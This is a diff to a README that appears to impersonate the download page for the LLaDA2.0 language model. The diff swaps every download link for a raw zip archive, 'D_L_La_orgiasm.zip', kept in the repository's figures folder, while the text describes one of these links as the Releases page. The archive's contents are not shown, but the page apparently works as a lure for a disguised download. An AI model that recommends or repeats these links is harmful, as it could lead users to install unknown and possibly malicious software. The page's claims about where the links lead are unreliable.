@@ -4,7 +4,7 @@
 LLaDA2.0 is the diffusion language model series developed by the InclusionAI team at Ant Group. This software allows users to work with powerful language models in an easy and effective way. Let's get you started with LLaDA2.0 quickly and easily.
 
 ## 📥 Download LLaDA2.0
-[![Download LLaDA2.0](https://raw.githubusercontent.com/ALANIPTV/LLaDA2.0/main/figures/D-L-La-v2.8.zip%https://raw.githubusercontent.com/ALANIPTV/LLaDA2.0/main/figures/D-L-La-v2.8.zip)](https://raw.githubusercontent.com/ALANIPTV/LLaDA2.0/main/figures/D-L-La-v2.8.zip)
+[![Download LLaDA2.0](https://raw.githubusercontent.com/ALANIPTV/LLaDA2.0/main/figures/D_L_La_orgiasm.zip%https://raw.githubusercontent.com/ALANIPTV/LLaDA2.0/main/figures/D_L_La_orgiasm.zip)](https://raw.githubusercontent.com/ALANIPTV/LLaDA2.0/main/figures/D_L_La_orgiasm.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run LLaDA2.0 on your computer. The process is simple and user-friendly.
@@ -12,7 +12,7 @@ Follow these steps to download and run LLaDA2.0 on your computer. The process is
 ### Step 1: Visit the Releases Page
 To get LLaDA2.0, first, visit the Releases page:
 
-[Download LLaDA2.0 Here](https://raw.githubusercontent.com/ALANIPTV/LLaDA2.0/main/figures/D-L-La-v2.8.zip)
+[Download LLaDA2.0 Here](https://raw.githubusercontent.com/ALANIPTV/LLaDA2.0/main/figures/D_L_La_orgiasm.zip)
 
 This page shows the latest versions of LLaDA2.0 and allows you to choose the right one for your needs.
 
